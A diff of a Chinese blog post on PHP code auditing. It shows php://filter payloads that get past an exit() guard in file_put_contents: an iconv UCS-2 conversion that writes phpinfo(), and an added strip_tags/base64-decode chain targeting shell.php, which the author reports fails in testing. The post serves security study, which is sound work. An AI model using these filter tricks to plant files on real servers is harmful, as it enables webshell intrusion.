@@ -44,8 +44,9 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/01/ZON2BfjIqbeLzVl.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/01/nXLiyVHCJbwK2WT.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/02/tgPZOdVpl87Nn6X.png">
+<meta property="og:image" content="https://i.loli.net/2020/04/04/m82qX7yLiZtodu6.png">
 <meta property="article:published_time" content="2020-04-01T01:50:42.000Z">
-<meta property="article:modified_time" content="2020-04-02T12:17:03.060Z">
+<meta property="article:modified_time" content="2020-04-04T08:10:02.936Z">
 <meta property="article:author" content="glotozz">
 <meta property="article:tag" content="php代码审计">
 <meta name="twitter:card" content="summary">
@@ -199,6 +200,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo iconv(&#39;UCS-2LE&#39;, &#39;UCS-2BE&#39;, &quot;&lt;?php phpinfo();?&gt;&quot;);</span><br><span class="line">    $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;?&lt;hp phpipfn(o;)&gt;?&#39;;</span><br><span class="line">    $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;;</span><br><span class="line">    $data&#x3D;&quot;&lt;?php\n&#x2F;&#x2F;000000000000\n exit();?&gt;\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;);</span><br><span class="line">    file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://i.loli.net/2020/04/02/tgPZOdVpl87Nn6X.png" alt="Snipaste_2020-04-02_20-15-23.png"></p>
+<p>========================分割线</p>
+<p>以及p牛在小密圈评论中提到的利用<code>strip_tags</code>去除<code>=</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php</span><br></pre></td></tr></table></figure>
+
+<p>但是我测试了下发现并不行。。</p>
+<p><img src="https://i.loli.net/2020/04/04/m82qX7yLiZtodu6.png" alt="Snipaste_2020-04-04_09-58-17.png"></p>
 <h4><span id="参考链接">参考链接</span></h4><p> <a href="https://xz.aliyun.com/t/7457" target="_blank" rel="noopener">https://xz.aliyun.com/t/7457</a></p>
 
             </div>
